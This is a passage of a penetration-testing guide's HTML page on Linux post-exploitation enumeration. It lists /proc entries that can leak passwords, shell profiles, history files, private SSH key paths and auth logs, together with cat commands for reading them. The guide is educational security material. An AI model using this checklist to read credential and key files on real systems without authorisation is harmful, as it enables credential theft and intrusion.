<span class="go">  cat /etc/lsb-release      # Debian based</span>
<span class="go">  cat /etc/redhat-release   # Redhat based</span>
</pre></div>
</div>
</section>
<section id="proc-variables">
<h3>/Proc Variables<a class="headerlink" href="#proc-variables" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">/proc/sched_debug      This is usually enabled on newer systems, such as RHEL 6.  It provides information as to what process is running on which cpu.  This can be handy to get a list of processes and their PID number.</span>
<span class="go">/proc/mounts           Provides a list of mounted file systems.  Can be used to determine where other interesting files might be located</span>
<span class="go">/proc/net/arp          Shows the ARP table.  This is one way to find out IP addresses for other internal servers.</span>
<span class="go">/proc/net/route        Shows the routing table information.</span>
<span class="go">/proc/net/tcp</span>
<span class="go">/proc/net/udp          Provides a list of active connections.  Can be used to determine what ports are listening on the server</span>
<span class="go">/proc/net/fib_trie     This is used for route caching.  This can also be used to determine local IPs, as well as gain a better understanding of the target&#39;s networking structure</span>
<span class="go">/proc/version          Shows the kernel version.  This can be used to help determine the OS running and the last time it&#39;s been fully updated.</span>
</pre></div>
</div>
<p>Each process also has its own set of attributes.  If we have the PID number and access to that process, then we can obtain some useful information about it, such as its environmental variables and any command line options that were run.  Sometimes these include passwords.  Linux also has a special proc directory called self which can be used to query information about the current process without having to know it’s PID.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">/proc/[PID]/cmdline    Lists everything that was used to invoke the process. This sometimes contains useful paths to configuration files as well as usernames and passwords.</span>
<span class="go">/proc/[PID]/environ    Lists all the environment variables that were set when the process was invoked.  This also sometimes contains useful paths to configuration files as well as usernames and passwords.</span>
<span class="go">/proc/[PID]/cwd        Points to the current working directory of the process.  This may be useful if you don&#39;t know the absolute path to a configuration file.</span>
<span class="go">/proc/[PID]/fd/[#]     Provides access to the file descriptors being used.  In some cases this can be used to read files that are opened by a process.</span>
</pre></div>
</div>
<p>The information about Proc variables has been taken from <a class="reference external" href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/">Directory Traversal, File Inclusion, and The Proc File System</a></p>
</section>
<section id="environment-variables">
<h3>Environment Variables<a class="headerlink" href="#environment-variables" title="Link to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>/etc/profile
cat<span class="w"> </span>/etc/bashrc
cat<span class="w"> </span>~/.bash_profile
cat<span class="w"> </span>~/.bashrc
cat<span class="w"> </span>~/.bash_logout
</pre></div>
</div>
</section>
<section id="configuration-files">
<h3>Configuration Files<a class="headerlink" href="#configuration-files" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>Apache Web Server : Helps in figuring out the DocumentRoot where does your webserver files are?</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">/etc/apache2/apache2.conf</span>
<span class="go">/etc/apache2/sites-enabled/000-default</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="user-history">
<h3>User History<a class="headerlink" href="#user-history" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">~/.bash_history</span>
<span class="go">~/.nano_history</span>
<span class="go">~/.atftp_history</span>
<span class="go">~/.mysql_history</span>
<span class="go">~/.php_history</span>
<span class="go">~/.viminfo</span>
</pre></div>
</div>
</section>
<section id="private-ssh-keys-ssh-configuration">
<h3>Private SSH Keys / SSH Configuration<a class="headerlink" href="#private-ssh-keys-ssh-configuration" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account</span>
<span class="go">~/.ssh/identity.pub</span>
<span class="go">~/.ssh/identity</span>
<span class="go">~/.ssh/id_rsa.pub</span>
<span class="go">~/.ssh/id_rsa</span>
<span class="go">~/.ssh/id_dsa.pub</span>
<span class="go">~/.ssh/id_dsa</span>
<span class="go">/etc/ssh/ssh_config  : OpenSSH SSH client configuration files</span>
<span class="go">/etc/ssh/sshd_config : OpenSSH SSH daemon configuration file</span>
</pre></div>
</div>
</section>
<section id="logs-files">
<h3>Logs Files<a class="headerlink" href="#logs-files" title="Link to this heading"></a></h3>
<p>Anything helpful in the logs file? Imagine, user running a command and that being logged in auth.log?</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cat /var/log/auth.log</span>
</pre></div>
</div>
<p>Usually, any log files present in /var/log directory might be important.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</span>
</pre></div>
</div>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="LFC-VM-P0-InitialRecon.html" class="btn btn-neutral float-left" title="Initial Recon" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html" class="btn btn-neutral float-right" title="Unprivileged Shell to Privileged Shell" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
  </div>

   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(false);
      });
  </script> 

</body>
</html>